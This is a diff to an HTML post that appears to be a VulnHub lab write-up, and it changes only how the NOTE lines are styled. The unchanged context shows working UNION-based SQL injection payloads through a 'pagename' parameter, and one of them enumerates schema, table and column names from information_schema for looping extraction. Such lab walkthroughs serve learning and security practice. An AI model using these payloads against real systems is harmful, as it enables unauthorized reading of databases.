@@ -320,8 +320,8 @@ tags: [vulnhub]
     <div>pagename=1' union all select concat_ws(0x2E, 0x23, ifnull(cast(%column_name% as char),0x20), 0x23) from %schema.table% limit 1 offset %num%#</div>
 </div>
 <div><br /></div>
-<div><i>NOTE: I put percent signs (%) around fields we will change based on our query.</i></div>
-<div><i>NOTE: I'm using concat_ws (concat with separator) to combine my columns into one string. The first parameter is the separator (0x2E = '.'). I'm also placing a '#' sign (0x23) at the start and end of my list of columns. This will result in a value like %.col1.col2.col3.%, which should make it easier to parse out of the page using grep.</i></div>
+<div class="note"><b>NOTE:</b> I put percent signs (%) around fields we will change based on our query.</div>
+<div class="note"><b>NOTE:</b> I'm using concat_ws (concat with separator) to combine my columns into one string. The first parameter is the separator (0x2E = '.'). I'm also placing a '#' sign (0x23) at the start and end of my list of columns. This will result in a value like %.col1.col2.col3.%, which should make it easier to parse out of the page using grep.</div>
 <div><br /></div>
 <div>The ifnull statement will return the second parameter (in my case, a space) if the first parameter comes back as null. We are also ensuring all values get returned as text.</div>
 <div><br /></div>
@@ -333,7 +333,7 @@ tags: [vulnhub]
     <div>pagename=1' union all select concat_ws(0x2E, 0x23, ifnull(cast(<font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">table_schema</font> as char),0x20), ifnull(cast(<font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">table_name</font> as char),0x20), ifnull(cast(<font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">column_name</font> as char),0x20), 0x23) from <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">information_schema.columns</font> where table_schema != 'performance_schema' and table_schema != 'information_schema' and table_schema != 'sys' and table_schema != 'mysql' limit 1 offset <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0</font>#</div>
 </div>
 <div><br /></div>
-<div><i>NOTE: I put the fields from earlier that were marked with percent sings in green.</i></div>
+<div class="note"><b>NOTE:</b> I put the fields from earlier that were marked with percent sings in green.</div>
 <div><br /></div>
 <div>Set in a loop (and URL encoded)...</div>
 <div><br /></div>
